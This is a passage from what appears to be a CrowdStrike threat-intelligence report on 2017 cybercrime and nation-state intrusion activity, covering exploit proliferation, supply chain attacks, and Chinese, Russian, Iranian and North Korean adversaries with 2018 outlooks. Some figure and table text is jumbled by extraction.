Necurs spambot), appeared to be a\nclear beneficiary of the Kelihos takedown. CraP2P\nhas not only distributed the pump-and-dump\nspam, but has also picked up WIZARD SPIDER\nand INDRIK SPIDER as possible customers.\nOperators of ransomware — particularly Jaff,\nLocky, and Globe Imposter — made use of\nCraP2P for distribution during Summer 2017.\n\n\n-----\n\n###### 20 21\n\n\n###### Spam Botnets and Law Enforcement  Spam botnets such as Cutwail and CraP2P, which have sustained operations in the wake of the ZOMBIE SPIDER takedown, are likely to continue at their current pace. However, established and well-resourced operations may develop in-house solutions for distributing their malware, as was observed from several banking Trojan operators experimenting with various propagation methods.\n\n Given the tenacity and anonymity that surrounds many cybercriminals, law enforcement actions such as takedowns, arrests and the sentencing of individuals who are involved in cybercrime are major successes for law enforcement agencies. These actions often temporarily splinter the criminal community, as actors examine their operational security (OPSEC) postures\n and look for alternative methods for committing their crimes.\n\n Despite the immediate results, disruptions can also create opportunities for ambitious criminal operators or prompt adversaries to retool. Therefore, continued vigilance is needed to assess the long-term effects on the\n overall threat landscape.\n\n Finally, financially motivated eCrime adversaries are not the only actors\n subject to legal ramifications. As described in the China section below,\n the U.S. Department of Justice (DoJ) announced several indictments against Chinese individuals linked to likely nation-state espionage operations. U.S. authorities may consider expanding this approach as a means to deter individuals from assisting in targeted intrusion operations.\n\n\n###### 2018 Outlook\n\n\n###### Exploit Proliferation\n\nAlthough the rise of nation-state ransomware\nwas perhaps the most visible TTP trend of\n2017, these attacks were enabled by several\nother TTPs that appeared to be on the rise,\nincluding the EternalBlue vulnerability and the\ncompromise of software update mechanisms.\nIn addition to EternalBlue, Falcon Intelligence\ntracked the proliferation of several notable\nvulnerabilities, including CVE-2017-0199 and\nCVE-2017-8759, which demonstrated similar\ntrajectories.\n\nThe ability to incorporate newly publicized\nvulnerabilities is an indication of a fairly\nsophisticated adversary — one with\ndevelopment resources sufficient to take\nadvantage of the vulnerability before large\norganizations can apply available patches.\nFigure 3 provides a timeline of how a few of the\nnotable exploits proliferated among several\nadversaries, both criminally motivated groups\nand state-sponsored actors.\n\nAs the exploit grows stale, it is often incorporated\ninto Metasploit modules or other custom builders,\nthus opening the door for other groups to adopt\nthese TTPs. COBALT SPIDER is suspected of using\nan exploit document builder. Such tools are for\nsale on Russian underground marketplaces. This\nadversary incorporated CVE-2017-0199, CVE2017-8759 and CVE-2017-11882 into their spearphishing operations shortly after zero-day.\n\nChinese adversaries also leveraged CVE-20170199, CVE-2017-8759 and CVE-2017-11882\ninto several disparate campaigns, likely at the\nhands of multiple separate groups. The rapid\nincorporation of all of these exploits into Chinabased operations suggests these adversaries\n\n\nmay have access to a centralized dissemination\nchannel for tools and exploits. It is also possible\nthat China was already aware of some or all of\nthese vulnerabilities. Recent industry reporting has\nsuggested that the Chinese National Vulnerability\nDatabase (CNNVD) is a loose cover for the Ministry\nof State Security (MSS) and provides early access\nof vulnerabilities to China’s intelligence services\nbefore publicly reporting them.\n\n###### Software Update\n Supply Chain Attacks\n\nSoftware supply chain attacks have long\nbeen associated with nation-state espionage\noperations, but in 2017, this technique appeared\nto spread. The infection of software update\nprocesses was observed in criminally motivated\nand destructive campaigns, in addition to likely\nstate-sponsored activity. Figure 4 provides a\nsummary of some of the notable incidents in\nthis TTP category.\n\nCrowdStrike also observed a variation of this\ntactic in which the attacker does not modify\nthe code, but instead uses brand-spoofing\nto facilitate an attack. In such an operation, a\nlegitimate application is advertised as available\nfor download; upon download, a user is\nprompted to update the software via adversarycontrolled infrastructure, thus providing an\navenue for malicious execution. This type of\nattack was used to distribute ProtonRAT in\nNovember 2017. The operation involved the\nregistration of a domain, symantecblog[.]com,\nwhich spoofs the blog for the information\nsecurity provider Symantec. The available\nhyperlink for downloading an antivirus tool from\nthat page consisted of a MacOS application\nthat delivers ProtonRAT.\n\n\n-----\n\n###### 22 23\n\n\n**Figure 4**\nNotable Supply\nChain Attacks in\n\n2017\n\n\n**Possible** **Suspected** **Criminally**\n\n**YES** **NO**\n\n**China?** **Nation State?** **Motivated**\n\n**NO** **NO**\n\n**Possible Gray Hat**\n\n**PyPI Typosquatting**\nIn September 2017, industry\nresearchers discovered that malicious\nPython packages residing in the\nPython Package Index (PyPI) were\n\n**M.E.Doc** masquerading as popular packages.\nInitial infections of NotPetya The names of the malicious packages\nappeared on systems running a approximated those of legitimate\nlegitimate updater for the packages and were delivered to users\ndocument management software who mistakenly typed the fake\nM.E.Doc.

Additional\nactivity from early in the year, which targeted\nChina-based cross-border payment services,\nsupports the conclusion that this group may\nsupport domestic investigations.\n\nThis adversary appeared to shift focus over\nthe course of the year, with likely Taiwanese\ntargeting in early 2017, targeting of Japan\nin mid-2017 and another shift to the Korean\nPeninsula in October 2017.\n\nIn April 2017, public reporting on a campaign\ndubbed “Cloud Hopper” described targeting\nof Japanese organizations in multiple sectors.\nThere is some evidence that STONE PANDA\nis behind the Cloud Hopper operation,\nand malware identified in December 2017\nsuggests this adversary is still active.\n\n\n###### 27\n Figure 5\n SUMMARY OF CHINESE TARGETING IN 2017 BY REGION\n U.K.\n\n Activity against a think tank entity was Japan ongoing through Vietnam the latter halfof 2017. & Myanmar Several named adversaries,including NUMBERED PANDA,\n STALKER PANDA, and WICKED\n For years, GOBLIN PANDA\n PANDA, were linked to\n has consistently targeted\n the targeting of Japan.\n Vietnam, and has possibly launched operations against\n U.S. Myanmar as well.\n\n Targeted sectors include think tanks, legal services, and medical research.\n\n Germany\n\n A suspected Chinese actor used CVE-2017-0199 and Cobalt Strike India & Russia Taiwan against a German conglomerate.

Contract companies — founded by leaders\nin computer science and maintaining a wide\nsocial network based on connections made\nvia old hacking forums — may be uninhibited\nby bureaucracy that affects the PLA or large\nChinese intelligence organizations. If true, these\nadversaries can likely execute operations and\nincorporate tools more rapidly.\n\nThroughout 2017, WICKED PANDA embodied\nwhat Falcon Intelligence would expect from\na contract entity. This adversary improved\noperational security and anti-analysis TTPs,\nevidenced by the use of machine-specific\ndecryption keys. The use of dead-drop\nresolver (DDR) command and control (C2),\nobfuscation techniques, and encrypted payloads\ndemonstrates a higher sophistication than\nwhat was previously observed from Chinese\nadversaries associated with the PLA. WICKED\nPANDA continued to target a diverse set of\nsectors and regions, possible evidence that\nofficial tasking is provided for specific operations\nthat require these advanced techniques.\n\nContract entities may also be able to cast a\nwide net for victims, sitting on the compromise\nuntil they can effectively use the access. TTPs\nfor acquiring large numbers of potential victims\ninclude strategic web compromises, supply\nchain compromises and mass spear phishing.\n\n**Chinese Nationals with Links to Cyber**\n**Espionage Named in DoJ Indictments**\nDismantling social relationships between\ncontractors and government officials will likely\nprove to be difficult, but as part of this process,\nthe U.S. DoJ announced several indictments\naimed at Chinese nationals suspected of\ncontributing to nation-state espionage\noperations. In late August, Yu Pingan (aka\nGoldSun) was indicted in connection with a\nseries of high-profile attacks targeting western\naerospace and technology firms. Yu was accused\nof providing material support to China-based\n\n\nadversary groups in the form of Sakula, Hkdoor,\nand Adjesus malware variants. The description of\nthe malicious activity detailed in the indictment\nstrongly corresponds to existing CrowdStrike\nreporting, published in February 2014, describing\nintrusion operations targeting several aerospace\norganizations in 2012 and 2014. Additional\nanalysis of the infrastructure associated with the\n2011-2014 activity and listed in the indictment\nshows overlaps with TURBINE PANDA and\nSAMURAI PANDA, adversaries that have also\ntargeted elements of the aerospace industry.\n\nFollowing the GoldSun indictment, on November\n27, 2017, the U.S. District Court of Western\nPennsylvania unsealed an indictment against\nthree employees of Chinese cybersecurity\ncompany, Guangzhou Bo Yu Information\nTechnology Company Ltd. (Boyusec), charging\nthem with cyber-enabled theft of intellectual\nproperty from three separate U.S. companies.\nBoyusec was previously outed in public\nreporting in November 2016 for its connections\nto the Chinese Ministry of State Security (MSS)\nand Chinese telecom giant Huawei. The three\nindividuals named in the indictment — Wu\nYingzhuo, Dong Hao, and Xia Lei — were all\nemployees of Boyusec, with Wu and Dong\nbeing founding members and executives of the\ncompany.\n\nThough the indictment lays out charges for\nintrusion activity conducted against U.S.\ncompanies in the manufacturing, financial, and\naerospace sectors from 2011 through 2017, the\nactivities of Wu in particular can be traced back\nto at least 2005, and they have been previously\nidentified by Falcon Intelligence as GOTHIC\nPANDA. This adversary has historically used a\ndistinct implant known as Pirpi (aka UPS, as listed\nin the indictment), and is known for a methodical,\npersistent intrusion methodology with a high\ndegree of sophistication and OPSEC. Numerous\nCrowdStrike reports have described GOTHIC\nPANDA as a likely contractor for the MSS, based\non both its TTPs and operations that occurred\noutside normal Beijing working hours.\n\nThe effect of these indictments may drive all\nChina-based activity to adopt better OPSEC\ntechniques, a process that has already been\nobserved with the use of commodity tooling\nin a possible effort to hinder attribution. Within\n\n\nChina, individuals with connections to the old\nhacking groups are likely training second and\nthird generations of technically savvy operators,\nwho can incorporate lessons learned by their\npredecessors over the last decade.\n\n###### 2018 China  Outlook Falcon Intelligence expects that 2018 will be another transitional year for Chinese targeted intrusion activity. Groups associated with the PLA and Technical Reconnaissance Bureaus (TRBs) may follow the lead of contract groups, incorporating commodity tools and better OPSEC techniques into their TTPs. Additional attempts to reorganize the overall intelligence community in China may result in a centralized body that can provide better synthesis for cyber operations. Groups tied to well-resourced intelligence agencies will almost certainly have access to the results of additional upstream, supply chain compromises, a notable trend in 2017 that will likely continue.\n\n After the 2015 cyber agreement between the U.S. and China, there was a shift to acquiring intellectual property through the buy-out of foreign companies. Because of the large outflow of cash from China, this method may be discouraged in the near term; therefore, cyber operations to acquire intellectual property may rise again, affecting countries in Europe, Japan, the United States, and possibly Russia.\n\n There is some evidence that there has been a rise in U.S. targeting. The Trump administration has at times released strong rhetoric on China-U.S. relations, although in the latter half of 2017 this language shifted to one of cooperation in dealing with the potential nuclear threat of North Korea. In 2018, Falcon Intelligence assesses U.S. targeting will likely fall under three categories — pure espionage, opportunistic compromises of soft targets such as non-governmental organizations (NGOs) and think tanks, and operations that are such a high-priority, it is worth the risk of violating the 2015 agreement with the previous administration.\n\n\n-----\n\n###### 30 31\n\n Russia\n\n\nActivity attributed to Russia-based adversaries\nFANCY BEAR and BERSERK BEAR began\nto increase in Spring 2017. Both adversaries\ninitiated and maintained extensive operations\nthroughout 2017, demonstrating the capacity\nto target multiple sectors worldwide. Falcon\nIntelligence also identified evidence of tool\nupdates from VENOMOUS BEAR, suggesting\nthis adversary has been ramping up its\ndevelopment tempo.\n\nFANCY BEAR continued to show interest in\nWestern targets in the government, defense\nand military sectors. Many of these operations\nuse spear-phishing emails to deliver malware\npayloads to targets of interest. Several\ncampaigns during 2017 made use of zero-day\nexploits, underscoring the fact that FANCY\nBEAR is a well-resourced adversary. (See Figure\n6 for a timeline of some of the most notable\nobservations in 2017.)\n\nAmid a wide range of reconnaissance\noperations affecting numerous sectors,\n\n\nincluding energy and transportation verticals,\nBERSERK BEAR was involved in high-profile\nactivity targeting critical infrastructure\norganizations in the United States and Europe,\nas shown in Figure 7. The actor made use of\nnovel techniques aimed at compromising SMB\ncredentials at targeted organizations. Activity\nduring 2017, as well as historical BERSERK BEAR\noperations against critical infrastructure entities,\nindicate that this adversary could operate in\nsupport of cyber operational preparation of\nthe environment, which is meant to facilitate\nadditional military actions.\n\nThe interconnectivity of hacktivist groups\nwith Russian adversaries became a subject of\ndiscussion over the course of 2016, as evidence\nhas suggested that cyber operations are\ncoordinated with disinformation campaigns.\nIn 2017, the synchronization of these methods\nappeared to continue, with added measures\nby the Russian state to combat information it\ndeemed undesirable, and to control or monitor\nmedia on various technology platforms.\n\n\n**COZY**\nUnknown\n**BEAR**\n\n**VOODOO**\nUnknown\n**BEAR**\n\n\nFalcon Intelligence observed suspected COZY BEAR\nreconnaissance activity in January 2017. Although no further\nactivity could be conclusively linked to this adversary, the lack of\nevidence may not indicate an operational lull.\n\nCrowdStrike did not observe typical VOODOO BEAR activity in\n2017. However, the targeting and some of the TTPs of NotPetya\nand similar campaigns bear some hallmarks of what has been\nobserved previously from this adversary.\n\n**October**\nIncrease in the number\n\nUse of DownRange with\n\nof identified incidents.\n\nzero-day exploits\n\nDecoy documents appear\n\nCVE-2017-0262 and -0263\n\nto target NATO and/or\n\ntargeting Romanian Ministry\n\nEuropean government\n\nof Foreign Affairs\n\norganizations\n\n**May 3**\nSpear phishing\nusing a NATO **Late July** **October 20**\nschool theme New version Use of CVE-2017-11292\n\nof X-Agent\nidentified\n\n**Late July**\n**Late May**\nSensitive\nsources report\n\n**Late October -**\n\nFANCY BEAR\n\n**November 15**\n\nremains active\n\nSuspected targeting\n\nin Montenegro\n\nof U.S. think tanks\n\nMinistry of\n\nand Dutch law\n\nDefense\n\nenforcement\n\n\n**Figure 6**\nTimeline of\nNotable FANCY\n\nBEAR Activity\n\n\n**Adversary** **Ops Tempo** **Description**\n\n\n**Table 5**\nRussian\nAdversary\nActivity\n\n|Previo|Late January-Early February International Association of Athletics Federations (IAFF) compromised; possibly by FANCY BEAR October April 19 Increase in the number Use of DownRange with of identified incidents. zero-day exploits Decoy documents appea CVE-2017-0262 and -0263 to target NATO and/or targeting Romanian Ministry European government of Foreign Affairs organizations May 3 Spear phishing using a NATO Late July October 20 school theme New version Use of CVE-2017-11 of X-Agent identified Late July Late May Sensitive sources report Late Octob FANCY BEAR November remains active Suspected t usly compromised network in Montenegro of U.S. think Ministry of and Dutch l Defense enforcemen networks|\n|---|---|\n\n\nJAN FEB MAR APR MAY JUN JUL AUG SEP OCT NOV DEC\n\n###### 2017\n\n\n**FANCY**\nHigh\n**BEAR**\n\n**BERSERK**\nHigh\n**BEAR**\n\n**VENOMOUS**\nMedium\n**BEAR**\n\n\nThis adversary demonstrated a sustained interest in the\ngovernment, defense and military sectors of Europe and Eurasia,\nas well as organizations with connections to NATO.

Targeting included U.S. government organizations.\nThese operations historically overlap with what has previously\nbeen observed from ENERGETIC BEAR.\n\nIn 2017, evidence was identified that VENOMOUS BEAR has\ndeveloped a much wider toolset than previously observed. This\ndevelopment suggests that a re-energized operational tempo\nhas likely begun.\n\n\n-----\n\n###### INTERNATIONAL BERSERK BEAR TARGETING\n\n\n###### 32 33\n\n Netherlands\n Norway\n\n Russia\n France\n Italy\n U.K.\n ENERGY\n Ukraine\n Spain MARITIME\n Canada\n\n MANUFACTURING\n Azerbaijan\n EXTRACTIVE\n U.S.\n\n Belgium\n\n Figure 7\n Singapore\n INTERNATIONAL BERSERK BEAR TARGETING\n\n\n-----\n\n###### 34 35\n\n\nnetworks of interest for follow-on destructive\nattacks.\n\nTargeted intrusion activity linked to Iranian\nactors continued throughout 2017, with the\nCHARMING KITTEN and HELIX KITTEN actors\nmaintaining the highest operational tempo.\nCHARMING KITTEN consistently conducted\ncredential-stealing operations against domestic\npolitical dissidents and international antiregime targets, particularly in the run-up to the\nMay 2017 presidential election. HELIX KITTEN\nconsistently conducted targeted intrusion\noperations throughout 2017, heavily targeting\nentities in the Middle East, particularly Saudi\nArabia. Much of its activity leveraged its custom\nmalware implant known as Helminth, which the\nactor continues to develop over time.\n\n\n###### Continued Use\n of Hacktivist Front Groups\n\nIn 2016, Falcon Intelligence predicted Russian\nstate-sponsored adversaries would continue to\nuse possible hacktivist fronts. This was observed\nearly in 2017, when CyberBerkut and Guccifer 2.0\nreemerged in January after months of silence.\nBoth entities released statements refuting\nallegations that Russia tampered with the U.S.\npresidential election.\n\nCyberBerkut was also active in Summer\n2017. In July, the group released messaging\naimed at discrediting the Clinton Foundation\nand suggesting the Hillary Clinton campaign\nreceived funds through money laundering\nschemes with Ukrainian business entities. in\nAugust, it accused the U.S. government of\nusing Ukraine for biological testing purposes.\nAt inception, CyberBerkut focused on targeting\nUkraine and NATO, but recently and as evident\nin 2017, this group appeared to broaden its\nscope, focusing on the U.S. and its possible\nmeddling in Ukraine. CyberBerkut has previously\n\n\n**Table 6**\n\nIranian\nAdversary\n\nActivity\n\n\nbeen suspected of working in close coordination\nwith Russia state-sponsored adversaries.\n\nThe self-styled hacktivist group “Fancy Bears’\ninternational hack team” (FBIHT) released\ndocuments and data, purportedly stolen\nfrom sports regulation organizations. Falcon\nIntelligence assesses that FBIHT plays an active\nrole in Russian information operations against\nsports organizations with the goal of redeeming\nthe international perception of Russia as a\nleading sports nation, through hacking-enabled\ncampaigns designed to discredit other athletes\nand organizations. FBIHT is believed to operate\nin conjunction with Russian targeted intrusion\noperations, particularly those of FANCY BEAR.\nFANCY BEAR began targeting World AntiDoping Agency (WADA) resources, as well as\nthe Court of Arbitration for Sport (CAS), in early\nAugust 2016, then the International Olympic\nCommittee (IOC) in late 2016, and\nthe International Association of Athletics\nFederations (IAAF) in early 2017.\n\n\n###### Iran\n\nOperations linked to Iran largely targeted\nentities in the Middle East. Both named and\nunnamed Iranian adversaries appear to have\na specific interest in Saudi Arabia, in line with\nhistoric diplomatic disputes and cultural\ndifferences between these countries.\n\nThe most significant activity to occur early\nin 2017 was a wave of destructive attacks\nin January against entities in Saudi Arabia\nusing the malware known as Shamoon. The\nJanuary wave was a continuation of similar\ndestructive attacks observed at the end of 2016.\nCrowdStrike links the development of Shamoon\nmalware to an adversary known as VOLATILE\nKITTEN; however, there are indications that\nCHARMING KITTEN played a role in these\ndestructive attacks as an acquirer of access to\n\n\n**Adversary** **Ops Tempo** **Description**\n\n\nHELIX KITTEN made continuous updates to the Helminth\nimplant and demonstrated the capacity to repurpose exploits\nby incorporating CVE-2017-0199 a little more than a week\nafter zero-day. This adversary’s primary regional focus\nappears to be Saudi Arabia.\n\nThis adversary uses malicious, macro-enabled Microsoft\nOffice documents to deploy an open-source, Python-based\nmalware known as Pupy. Sectors targeted by this adversary\ninclude dissidents, NGOs, think tanks and political activists.\n\nThis adversary is credited with the Shamoon wiper. After early\n2017 Shamoon incidents, no further destructive activity was\nobserved.\n\n\n###### Russia  Officials in Moscow are expected to take measures to ensure the 2018 presidential election in Russia goes smoothly. Already, policies have been enacted to control social and news media platforms, and additional precautions will likely include domestic targeting of dissidents, and use of disinformation operations utilizing online platforms.\n\n Although FANCY BEAR appears to be one of the most active adversaries, it is equally likely that it is simply the most visible. More sophisticated adversaries, such as COZY BEAR and VENOMOUS BEAR, are very possibly conducting operations using newly developed tools and network access previously obtained by BERSERK BEAR’s extensive reconnaissance and exploitation efforts. In keeping with what was observed in the NotPetya\n and BadRabbit campaigns, Russia-based adversaries will continue to disguise campaigns and tools as cybercrime.\n\n\n###### 2018 Outlook\n\n\n**HELIX KITTEN** High\n\n**CHARMING KITTEN** High\n\n**VOLATILE KITTEN** Low\n\n\n-----\n\n###### 36 37\n\n\n###### Iran  On May 19, 2017, President Hassan Rouhani won re-election. Although often described as a moderate in the media, Rouhani has overseen the use of Iran’s cyber capabilities to curtail dissent, disseminate state-sponsored media content, and even launch destructive attacks. Rouhani also spearheaded the approval of the 2015 nuclear deal — the Joint Comprehensive Plan of Action (JCPOA) — which he advertised as being good for the economy in Iran. An Iranian economic boon has not materialized yet, and with the JCPOA failing to be re- certified by the Trump administration in Washington, Rouhani may turn to soft war doctrine — particularly disinformation operations — to discredit opposition both domestically and internationally.\n\n In October 2017, the U.S. government imposed a series of sanctions against the IRGC. The sanctioning of the IRGC and Iran’s ballistic missile program will likely lead to an increase in tensions between Iran and the U.S., and possibly between Iran and other western nations supporting U.S. policies. The Iranian government’s response has often been laden with warnings that it may withdraw from the JCPOA in retaliation, although this is unlikely given support from European countries for the plan. Again, Iran may turn to its information warfare apparatus to drive anti-U.S. sentiment.\n\n Considering the protests in late December 2017, Iranian adversaries will very likely continue to use cyber capabilities to stem unrest, silence dissident voices and censor undesirable information from Iranian networks. Iranian supreme leader Ayatollah Khamenei has claimed these protests were instigated by Iran’s enemies, and therefore additional targeting of entities outside of Iran — particularly in Saudi Arabia and other Middle East countries —\n may occur as a result. Regardless, the targeting of Saudi Arabian networks is almost certain to continue in the new year.\n\n\n###### Iran’s Soft War Doctrine Applied\n\nThroughout 2017, Falcon Intelligence observed\nevidence that Iran has incorporated elements\nof the “soft war” doctrine into cyber operations.\nThe soft war doctrine describes attempts to\ninhibit certain political, cultural and societal\ninfluences from entering Iranian society. This\nconcept arose following the 2009 presidential\nelection, and internally has featured the use of\ndisinformation to influence domestic audiences\nand silence dissident voices. The soft war\ndoctrine has also been the impetus behind\ncyber intrusion activity targeting activist groups.\n\nIn May 2017, Falcon Intelligence observed\nCHARMING KITTEN targeting NGOs, political\n\n\ndissidents and activist communities. The\nextensive infrastructure behind this campaign\nappeared to have been created between\nmid-April and early May 2017. Considering the\ntargeting profile and the operational time frame,\nthis activity may have been designed to provide\nsituational awareness to Iran’s leadership prior\nto the May 19, 2017, presidential election.\n\nThe outward-facing component of the soft war\ndoctrine aims to promote pro-Iran rhetoric and\ncounter the spread of the West’s cultural power.\nAs listed in the table below, additional activity\nfrom CHARMING KITTEN in Summer 2017\ndemonstrates an interest in compromising nondomestic targets that are perceived to operate\nagainst Iran.\n\n\n###### 2018 Outlook\n\n\n**Date** **Targeting** **Context**\n\n\n**Table 7**\nTimeline of\nCHARMING\nKITTEN Activity\nin the Context\nof Soft War\nEfforts\n\n\nNGOs, Dissidents,\n**April-May 2017**\nActivists\n\n**July 2017** Iraqi Kurds\n\n**August 2017** Western Think Tanks\n\nIn the pursuit of the soft war doctrine, Iran has\noften leveraged pro-Iran hacking groups, thus\nblurring the lines of state-sponsored cyber\nactivity. Activity from these cyber operatives\nwas observed in June 2017, when cyberattacks\noccurred within 24 hours of an Islamic State\nof Iraq and Syria (ISIS) bombing in Tehran. The\npro-Iran cyber response targeted Saudi Arabian\nwebsites — some reportedly affiliated with the\nSaudi government — with DDoS (distributed\ndenial of service) attacks and defacements.\n\n\nCHARMING KITTEN likely supported information\ngathering on politically vocal entities ahead of the\nIranian presidential election.\n\nIran likely had an interest in the movement for an\nindependent Kurdish state. In September 2017,\nKurds voted in favor of independence from Iraq,\nbut this movement is possibly perceived as a threat\nto the domestic security of Iran.\n\nThink tanks remain a strategically important target\nfor Iran’s counter-intelligence operations, as Iranian\nofficials have declared that some of these entities\noperate against their interests.\n\nConcurrently, information operations designed\nto tie Saudi Arabia to terrorist attacks appeared\nto have increased across social media platforms.\nNotably, Iranian leaders blamed Saudi Arabia\nfor the ISIS attack. The apparent timing of the\ndefacement efforts, information operations and\nstatements from Iranian government officials\nincreases the possibility that a coordinated\nresponse from state organizations such as\nthe Islamic Revolutionary Guard Corps (IRGC)\noccurred, although the exact degree of\ninvolvement could not be determined.\n\n\n-----\n\n###### 38 39\n\n North Korea\n\n\nLABYRINTH CHOLLIMA was also suspected of\ncontributing to a series of campaigns beginning\nin July 2017 that used financial- or Bitcointhemed lures, a previously unreported malware\ncalled HtDnLoader, and an EPS (encapsulated\nPostScript file) exploit carried within malicious\nHWP files. Although this operation was\nsuspected of targeting South Korea, part of\nthis adversary’s traditional target scope, the\nuse of cryptocurrency themes represents a\nnew interest for this actor. Additional targeting\nof cryptocurrency exchanges and financial\nsector targets may reflect the pursuit of\navenues to acquire foreign currency for\nthe Kim regime, much like the 2016 SWIFT\n(Society For Worldwide Interbank Financial\nTelecommunications) attacks attributed to\n**STARDUST CHOLLIMA.**\n\nWhile LABYRINTH CHOLLIMA has primarily\nbeen associated with espionage operations,\ncontinued code overlaps with other DPRK\nadversaries such as STARDUST CHOLLIMA\npresent several possibilities, including:\n\n- Joint operations conducted with the\n\nsupport of multiple groups\n\n- An operational hand-off among DPRK\n\nadversaries\n\n- A malware development organization\n\nsupplying technical support to\nmultiple groups\n\n\nFalcon Intelligence observed DPRK-based\ntargeted intrusion activity throughout 2017,\nwith growing evidence that these adversaries\nengage in operations on an international scale,\nnot only for the purposes of espionage but also\nto raise revenue for the Kim Jong Un regime.\nIn the latter half of 2017, diplomatic tensions\nand military threats between North Korea\nand the international community escalated\nsignificantly, driven by nuclear weapons testing\nand additional missile launches. The rising\ntensions have yet to lead to outright destructive\ncyberattacks from these adversaries, although\nwiper malware is a known component of the\ntoolkit available to DPRK adversaries.\n\n\nWhile tracking DPRK-based campaigns, Falcon\nIntelligence has identified several code-level\nsimilarities from malware families associated\nwith DPRK adversaries. In addition to what was\nobserved with WannaCry ransomware, new\nHawup variants associated with LABYRINTH\nCHOLLIMA contain code overlaps with the\nTwoPence framework attributed to STARDUST\nCHOLLIMA. Technical analysis continues to\nsupport the “code pool theory,” which suggests\nthe existence of a shared development\nenvironment that is accessible to multiple\nDPRK-based actors.\n\n\n###### Evidence of an Expanding\n Target Scope\n\nIn March 2017, Falcon Intelligence observed\na malicious Korean-language document that\ndelivered a Hawup payload. This incident,\nwhich was identified days before a March 6\nDPRK missile launch, is indicative of traditional\nLABYRINTH CHOLLIMA campaigns in that it\nappears to target South Korea and is timed\nwith missile testing. As the year progressed,\nhowever, CrowdStrike noted a shift in the\ntargeting of Hawup malware.\n\nAs early as April 2017, LABYRINTH CHOLLIMA\nbegan operations that used English job\ndescription decoy documents to target\nvictims in the U.S. and Europe. In September,\nsensitive source reporting indicated this\nactivity also impacted multiple U.S. electrical\nutilities. Although it is unclear whether the U.S.\nenergy sector has been a consistent target for\nLABYRINTH CHOLLIMA, this reported targeting\ncoincided with a sharp increase in rhetoric from\nthe U.S. and DPRK following President Trump’s\nspeech to the United Nations (UN) General\nAssembly, which was critical of the DPRK and\nits leader Kim Jong Un.\n\n\n**Adversary** **Ops Tempo** **Description**\n\n\n**Table 8**\nDPRK Adversary\nActivity\n\n\n**LABYRINTH CHOLLIMA** High\n\n**STARDUST CHOLLIMA** Medium/High\n\n**SILENT CHOLLIMA** Low\n\n\nThis adversary continued to improve the Hawup\nmalware, introducing new encryption techniques\nearly in 2017 and an Android variant in November 2017.\nOperations from this adversary continue to be timed\nwith missile launches, but increasingly, LABYRINTH\nCHOLLIMA TTPs are being used to target the financial\nand cryptocurrency sector.\n\nClosely associated with targeting the financial industry,\n(specifically the SWIFT compromises of 2016), this\nadversary continued to use the TwoPence malware\nframework. In May 2017, Falcon OverWatch observed\nTwoPence activity at an academic sector organization,\nsuggesting this adversary’s target scope is broader\nthan originally assessed.\n\nMost commonly associated with destructive activity,\nSILENT CHOLLIMA appears to have become less\nactive, or has been supplanted by new actor groups. It\nis also possible that this adversary is working in close\nconnection with the other DPRK groups in ways that\nhave not been directly observed.\n\n\n###### 2018 Outlook\n\n\n###### North Korea  Given the geopolitical tension surrounding the North Korean nuclear program, DPRK-based adversaries are likely to continue malicious cyber activity against entities in South Korea, Japan and the U.S. Network access obtained via remote access tools such as Hawup may be used to deploy wiper malware.\n\n\n-----\n\n###### 40 41\n\n Given the gravity of a possible compromise to the U.S. energy sector, Falcon 2018 Outlook Intelligence has assessed that this specific targeting may represent DPRK posturing via cyber operations that could deliver destructive effects against the U.S. critical infrastructure, should a military conflict occur.\n\n\n###### The possibility of continuing financial or Bitcoin-associated activity cannot be discounted, especially as economic sanctions reduce the number of foreign currency options for the Kim regime.\n\n HtDnLoader, a custom malware observed in this year’s BTC-themed campaigns, appeared to be created specifically for that operation, suggesting that DPRK adversaries can create single-use tools, expanding their TTPs as needed. Additionally, the new internet connection that the DPRK acquired via Russia in October 2017 may provide their cyber actors with more capacity for building infrastructure to support their offensive campaigns.\n\n Other Adversaries\n\n\nThis East Asia-based adversary uses macro-enabled documents to deliver\na malware dubbed KONNI. Observed themes for 2017 decoy documents\nsuggest this actor targets entities with an interest in Korean issues. Several of\nthese samples were identified in August at a time of rising tension between\nthe U.S. and North Korea.\n\nMYTHIC LEOPARD is a Pakistan-based adversary with operations likely\nlocated in Karachi. This adversary continued to use spear phishing to target\nIndian military and defense entities. Falcon Intelligence identified additional\ntooling for this adversary, including .NET-based binder tools used to disguise\nmalware as legitimate files, and a custom RAT called Waizsar, which is likely\nused as a first-stage downloader.\n\nIndia-based operations increased in late summer when a ChineseIndian border dispute sparked both military and cyber activity. At that\ntime, malicious documents dropped malware samples, which shared\ninfrastructure previously associated with VICEROY TIGER.\n\nFalcon Intelligence observed extensive activity from this adversary,\nsuggesting this group has taken on some of the operational tasks originally\ngiven to VICEROY TIGER. India-based targeted intrusion historically focused\non Pakistan military targets, but QUILTED TIGER has expanded this target\nscope to include China, Mongolia, Bangladesh and in December 2017, Japan.\nThis adversary uses commodity tools and exploits (such as CVE-2017-8759\nand CVE-2017-11882) after zero-day.\n\nIn the latter half of 2017, Falcon Intelligence tracked a targeted intrusion\ncampaign leveraging H-Worm and likely targeting victims with an interest\nin or involvement with Palestinian political affairs. Observed activity spoofed\nPalestinian news websites and was present before and after the FatahHamas reconciliation agreement announced in early October 2017. Falcon\nIntelligence attributes this campaign to EXTREME JACKAL with medium\nconfidence, based on C2 infrastructure overlaps, third-party reporting\nand overall consistency in TTPs. Victims in this campaign were likely\nconcentrated in the Palestinian Territories, the United Arab Emirates (UAE)\nand Egypt. Falcon Intelligence maintains an assessment that EXTREME\nJACKAL is likely an Arabic-speaking, non-state actor operating — at least\nin part — from Gaza, and likely has aligned interests with Hamas. Additional\nactivity leveraging malware known as KASPERAGENT was also observed,\nfollowing the announced Fatah-Hamas reconciliation.\n\n\n**Babylon**\n\n**MYTHIC LEOPARD**\n\n**VICEROY TIGER**\n\n**QUILTED TIGER**\n\n**EXTREME JACKAL**\n(and other\nPalestine-based\ngroups)\n\n\n**Adversary** **Details**\n\n\n**Table 9**\nAdditional\nAdversary Activity\n\n\n**PoSeidon**\n\n**OceanLotus**\n(aka APT32)\n\n\nAlthough no extensive activity was observed from this activity, an incident\nleveraging CVE-2017-0199 and possibly targeting entities in Brazil was identified\nin April 2017, shortly after the zero-day of this vulnerability.\n\nFalcon Intelligence observed intermittent activity linked to this Southeast Asiabased adversary. Identified incidents used CVE-2017-0199 exploit documents to\ntarget the Philippines, with additional activity focused on the hospitality sector.\nPublic reporting also ascribed a months-long strategic web compromise (SWC)\ncampaign to OceanLotus. This campaign leveraged compromised websites for\norganizations in sectors such as government, military, human rights, oil and gas,\nand media located in Southeast 